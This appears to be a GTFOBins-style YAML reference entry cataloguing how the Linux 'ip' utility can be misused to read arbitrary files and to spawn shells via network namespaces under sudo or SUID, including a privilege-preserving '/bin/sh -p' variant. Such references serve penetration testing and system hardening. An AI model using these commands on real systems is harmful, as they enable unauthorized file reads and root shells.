---
functions:
  file-read:
  - binary: false
    code: |-
      ip -force -batch /path/to/input-file
    comment: |-
      The read file content is corrupted by error prints.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      ip netns add foo
      ip netns exec foo /bin/sh
      ip netns delete foo
    contexts:
      sudo:
      suid:
        code: |-
          ip netns add foo
          ip netns exec foo /bin/sh -p
          ip netns delete foo
    version: |-
      This only works for Linux with `CONFIG_NET_NS=y`.
  - code: |-
      ip netns add foo
      ip netns exec foo /bin/ln -s /proc/1/ns/net /var/run/netns/bar
      ip netns exec bar /bin/sh
      ip netns delete foo
      ip netns delete bar
    contexts:
      sudo:
    version: |-
      This only works for Linux with `CONFIG_NET_NS=y`.
...
